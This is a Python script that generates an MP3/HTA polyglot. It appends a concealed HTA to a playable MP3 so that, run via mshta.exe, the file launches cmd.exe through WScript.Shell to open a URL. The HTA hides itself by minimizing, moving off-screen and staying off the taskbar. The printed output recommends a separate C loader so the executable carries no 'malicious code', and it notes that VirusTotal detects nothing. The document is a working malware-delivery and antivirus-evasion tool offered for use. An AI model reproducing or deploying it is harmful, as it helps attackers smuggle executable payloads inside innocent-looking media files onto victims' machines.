#!/usr/bin/env python3
"""
Simple MP3 Comment Polyglot

Creates a dual-purpose file by adding an HTA payload to an MP3 file
while preserving its playability.

1. MP3 players read from the beginning and stop at the end of valid MP3 data
2. mshta.exe scans for HTA content anywhere in the file

"""

import os

# Modify these as needed
INPUT_MP3 = "backup.mp3"
OUTPUT_MP3 = "modified.mp3"
TARGET_URL = "https://hacknexus.io"

def create_hta_code(url):
    """Generate HTA code that launches the default browser"""
    
    hta_code = f"""<html>
<head>
<HTA:APPLICATION 
    ID="MP3Player"
    APPLICATIONNAME="MP3 Player"
    SINGLEINSTANCE="yes"
    BORDER="none"
    WINDOWSTATE="minimize"
    SHOWINTASKBAR="no"
/>
<script language="JScript">
// Minimize visibility
window.resizeTo(1,1);
window.moveTo(-2000,-2000);

window.onload = function() {{
    try {{
        var shell = new ActiveXObject("WScript.Shell");
        shell.Run('cmd.exe /c start {url}', 0, false);
        setTimeout(function() {{ window.close(); }}, 1000);
    }} catch(e) {{
        window.close();
    }}
}}
</script>
</head>
<body style="visibility:hidden">
<!-- This is a media player -->
</body>
</html>
"""
    return hta_code

def create_mp3_hta_polyglot():
    try:
        if not os.path.exists(INPUT_MP3):
            print(f"Error: Input file '{INPUT_MP3}' not found!")
            return False
            
        hta_code = create_hta_code(TARGET_URL)
       
        with open(INPUT_MP3, 'rb') as f:
            mp3_data = f.read()
        
        with open(OUTPUT_MP3, 'wb') as f:
            f.write(mp3_data)
            f.write(b'\r\n<!-- MP3 Data End -->\r\n')
            f.write(hta_code.encode('utf-8'))
        
        full_output_path = os.path.abspath(OUTPUT_MP3)
        current_dir = os.getcwd()
        
        print(f"[+] Successfully created {OUTPUT_MP3}")
        print(f"[+] The file can be played as a normal MP3")
        print(f"[+] When executed with mshta.exe, it will open {TARGET_URL} in the default browser")
        return full_output_path, current_dir
        
    except Exception as e:
        print(f"[-] Error: {str(e)}")
        return False

if __name__ == "__main__":
    print("Simple MP3 Comment Polyglot Generator")
    print(f"[*] Input: {INPUT_MP3}")
    print(f"[*] Output: {OUTPUT_MP3}")
    print(f"[*] Target URL: {TARGET_URL}")
    
    result = create_mp3_hta_polyglot()
    if result:
        full_path, current_dir = result
        print("\n[+] Done! The file is ready.")
        print(f"[+] Current directory: {current_dir}")
        print(f"[+] Full path to output file: {full_path}")
        print(f"[+] Run the file with: mshta.exe \"{full_path}\"")
        print(f"[+] When executed, it will open {TARGET_URL} in the default browser")
        print(f"\n\n[+] My advice is to make C code that finds the mp3 in the current folder and executes it. This would mean the .exe wouldn't contain any malicious code.")
        print(f"Virus total detects 0 malware in the mp3 file itself.")
    else:
        print("\n[-] Failed to create polyglot file.")
